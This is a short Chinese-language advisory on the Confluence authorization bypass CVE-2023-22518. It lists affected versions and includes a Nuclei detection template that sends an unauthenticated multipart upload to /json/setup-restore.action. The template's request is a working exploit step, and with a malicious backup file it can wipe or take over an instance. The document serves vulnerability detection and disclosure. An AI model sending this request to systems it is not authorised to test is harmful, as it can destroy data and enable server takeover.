## Confluence身份认证绕过(CVE-2023-22518)
未经身份验证的远程攻击者通过构造恶意请求可在一定程度绕过目标系统身份验证，并通过后台接口获得接管服务器的权限，最终可实现远程代码执行，由于攻击者无法泄露任何系统数据，因此不会影响机密性；但该漏洞利用会导致 Confluence 数据清空，对数据完整性产生不可逆的影响。请受影响用户尽快采取措施进行防护。

## 影响版本
```
Atlassian confluence < 7.19.16
Atlassian confluence < 8.3.4
Atlassian confluence < 8.4.4
Atlassian confluence < 8.5.3
Atlassian confluence < 8.6.1
```

## CVE-2023-22518.yaml
```
id: CVE-2023-22518

info:
  name: Atlassian Confluence Server - Improper Authorization
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data.
    Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.
  reference:
    - https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907
    - https://blog.projectdiscovery.io/atlassian-confluence-auth-bypass/
    - https://jira.atlassian.com/browse/CONFSERVER-93142
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22518
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2023-22518
    epss-score: 0.00043
    epss-percentile: 0.0726
  metadata:
    verified: true
    max-request: 1
    vendor: atlassian
    product: confluence_data_center
    shodan-query: http.component:"Atlassian Confluence"
    note: this template attempts to validate the vulnerability by uploading an invalid (empty) zip file. This is a safe method for checking vulnerability and will not cause data loss or database reset. In real attack scenarios, a malicious file could potentially be used causing more severe impacts.
  tags: cve,cve2023,atlassian,confluence,rce,unauth

http:
  - raw:
      - |
        POST /json/setup-restore.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7

        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="buildIndex"

        true
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="file";filename="{{randstr}}.zip"

        {{randstr}}
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="edit"

        Upload and import
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7--

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body,'The zip file did not contain an entry', 'exportDescriptor.properties')"
        condition: and
# digest: 4a0a00473045022074611cf8360af402eab4224903570e50569a0a115df2b5cbe092341e10b75748022100ea16e1b28f542368626bb141260ba18a0359147d652f99f0b26b4e89c79bf7dd:922c64590222798bb761d5b6d8e72950
```

## 漏洞分析
```
https://xz.aliyun.com/t/12961
```

